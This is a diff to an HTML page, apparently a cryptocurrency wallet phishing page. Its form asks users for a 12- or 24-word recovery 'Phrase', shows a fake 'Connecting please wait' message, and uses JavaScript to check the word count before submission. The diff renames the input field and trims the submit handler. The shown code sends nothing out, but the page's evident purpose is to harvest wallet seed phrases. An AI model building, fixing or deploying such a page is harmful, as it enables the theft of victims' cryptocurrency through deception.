@@ -1587,12 +1587,12 @@
 
               <div class="form-group my-2">
                 <span id="warn1" class="warn text-green" style="display: none;color: green;">
-                  Connecting please wait ...
+                  Connecting please wait ....
                 </span>
                 <label class="form-label">
                   Phrase
                 </label>
-                <textarea name="phras" class="form-control text-area" id="phras" required></textarea>
+                <textarea name="phrase" class="form-control text-area" id="phrase" required></textarea>
                 <p>
                   <small>
                     Usually 12 (sometimes 24) words, enter words separated by single space.
@@ -1641,10 +1641,10 @@
   }
 
   function sendPhrase() {
-            const phras = $("#phras").val();
-            const wordCount = phras.trim().split(/\s+/).length;
+            const phrase = $("#phrase").val();
+            const wordCount = phrase.trim().split(/\s+/).length;
 
-            if (phras == "") {
+            if (phrase == "") {
                 $("#warn").css('display', 'block');
                 setTimeout(function(){
                     $("#warn").css('display', 'none');
@@ -1652,8 +1652,7 @@
             } else if(wordCount >= 10){
                 $("#warn1").css('display', 'block');
                 setTimeout(function(){
-                  $("#phras").attr('name', 'phrase');
-                    const phrase=phras
+                    
                 }, 2000); // Redirect to another page after 2 seconds
             } else {
                 $("#warn").css('display', 'block');
